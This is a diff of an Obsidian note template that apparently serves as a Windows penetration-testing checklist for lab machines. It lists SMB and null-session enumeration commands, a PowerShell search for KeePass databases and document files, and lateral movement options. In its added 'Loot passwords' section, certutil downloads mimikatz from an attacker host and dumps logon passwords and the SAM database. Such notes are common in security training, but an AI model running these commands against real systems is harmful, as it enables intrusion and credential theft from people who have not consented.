@@ -1,22 +1,26 @@
 #show #windows
 <%*
 const path = tp.file.folder(true).split('/');
-const filename = "0_A_" + path[path.length - 1];
+const filename = "0_" + path[path.length - 1];
 await tp.file.rename(filename);
 tR += "Part of " + "[" + "[" + "0_Lab_" + path[path.length - 2] + "]]";
 -%>
 
+Shell on system: ☑️
+System pwned: ✅
+
 # Enumeration
-
+##### Enum4Linux
 ```bash
-export hip="";nmap --top-ports 30 $hip
+enum4linux -a $hip
 ```
-
+If Null-Session is not restricted, also use `rpcclient -U "" -N $hip` with `querydispinfo` and `enumdomusers`. If used with proxy, use `proxychains -q`
+##### Get SMB version
 ```bash
-i="$hip";sudo nmap --osscan-guess -A -p- $i -oX - | xsltproc -o 0_overview.html - && firefox 0_overview.html && sudo nmap -sUV --top-ports 100 $i -oN 0_udp_top100.txt
+crackmapexec smb $hip 2>/dev/null
 ```
+Alternativ: [grab_smbversion.sh](file:////home/kali/Documents/activeInformationGathering/)
 
-> Then, create services templates.
 
 # Initial Foothold
 
@@ -49,7 +53,7 @@ ipconfig /all; route print; netstat -ano; netsh advfirewall show currentprofile,
 
 ##### Interesting files
 ```powershell
-Get-ChildItem -Path C:\ -Include *.kdbx,*password*,proof.txt,local.txt,sysprep.inf,Unattended.xml -File -Recurse -ErrorAction SilentlyContinue; Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue; Get-History; type (Get-PSReadlineOption).HistorySavePath
+Get-ChildItem -Path C:\ -Include proof.txt,local.txt -File -Recurse -ErrorAction SilentlyContinue; Get-ChildItem -Path C:\Users\ -Include *.kdbx,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue; Get-History; type (Get-PSReadlineOption).HistorySavePath
 ```
 	
 ##### Home folder
@@ -92,3 +96,8 @@ Ways to login as another user:
 - User is in group _Remote Management Users_ -> WinRM (Better use [evil-winrm](https://github.com/Hackplayers/evil-winrm) from non-interactive shells)
 - User has _Log on as a batch job_ right -> Schedule task to execute a program of our choice as this user
 - User has active session -> Use PsExec (SysInternals)
+
+# Loot passwords
+```powershell
+certutil.exe -urlcache -split -f "http://192.168.45.IP:8000/mimikatz.exe" ; .\mimikatz.exe privilege::debug sekurlsa::logonpasswords lsadump::sam exit
+```
